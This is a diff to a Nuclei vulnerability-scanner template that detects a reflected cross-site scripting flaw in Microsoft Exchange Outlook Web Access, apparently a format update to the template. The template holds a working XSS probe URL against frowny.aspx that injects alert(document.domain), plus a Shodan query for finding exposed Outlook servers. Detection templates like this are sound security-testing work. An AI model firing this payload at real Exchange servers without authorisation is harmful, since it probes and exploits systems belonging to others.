@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ms-exchange-server-reflected-xss
 info:
   name: MS Exchange Server XSS
@@ -8,7 +9,7 @@ info:
   metadata:
     shodan-query: http.title:"Outlook"
   tags: microsoft,exchange,owa,xss
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'
